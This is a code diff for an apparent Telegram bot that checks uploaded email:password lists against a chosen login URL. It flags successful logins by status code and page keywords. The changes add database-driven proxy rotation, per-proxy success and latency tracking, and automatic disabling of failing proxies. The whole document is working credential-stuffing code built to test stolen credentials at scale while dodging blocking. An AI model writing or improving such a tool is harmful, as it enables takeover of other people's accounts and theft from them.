@@ -507,7 +507,8 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             await file_obj.download_to_drive(filename)
             
-            proxy = user_sessions.get(user_id, {}).get('proxy', '')
+            # Get best active proxy from database
+            proxy = get_active_proxy(user_id)
             await process_credentials(update, context, filename, state['login_url'], proxy)
             
         except Exception as e:
@@ -624,7 +625,10 @@ async def process_credentials(update: Update, context: ContextTypes.DEFAULT_TYPE
         await update.message.reply_text("❌ **Processing failed** - try again")
 
 async def test_credential(credential: str, login_url: str, proxy_url: str = '') -> bool:
-    """Test single credential"""
+    """Test single credential with proxy tracking"""
+    start_time = time.time()
+    success = False
+    
     try:
         email, password = credential.split(':', 1)
         
@@ -657,6 +661,7 @@ async def test_credential(credential: str, login_url: str, proxy_url: str = '') 
             follow_redirects=True
         ) as client:
             response = await client.post(login_url, data=data)
+            response_time = time.time() - start_time
             
             # Success indicators
             success_indicators = [
@@ -665,10 +670,43 @@ async def test_credential(credential: str, login_url: str, proxy_url: str = '') 
             ]
             
             page_text = response.text.lower()
-            return (response.status_code < 400 and 
-                   any(indicator in page_text for indicator in success_indicators))
+            success = (response.status_code < 400 and
+                      any(indicator in page_text for indicator in success_indicators))
             
-    except Exception:
+            # Update proxy stats if proxy was used
+            if proxy_url:
+                update_proxy_stats(proxy_url, True, response_time)
+            
+            return success
+            
+    except Exception as e:
+        # Update proxy stats on failure
+        if proxy_url:
+            update_proxy_stats(proxy_url, False, 0.0)
+            
+            # Auto-disable proxy if it has too many failures
+            try:
+                conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+                cursor = conn.cursor()
+                cursor.execute('''
+                    SELECT fail_count, success_count
+                    FROM proxies
+                    WHERE proxy_url = ?
+                ''', (proxy_url,))
+                result = cursor.fetchone()
+                
+                if result:
+                    fail_count, success_count = result
+                    # Disable if fail rate > 80% and at least 10 attempts
+                    if (fail_count + success_count) >= 10 and fail_count / (fail_count + success_count) > 0.8:
+                        conn.execute('UPDATE proxies SET is_active = 0 WHERE proxy_url = ?', (proxy_url,))
+                        conn.commit()
+                        logger.warning(f"🔴 Auto-disabled dead proxy: {proxy_url}")
+                
+                conn.close()
+            except:
+                pass
+        
         return False
 
 async def cleanup_file(filename: str):
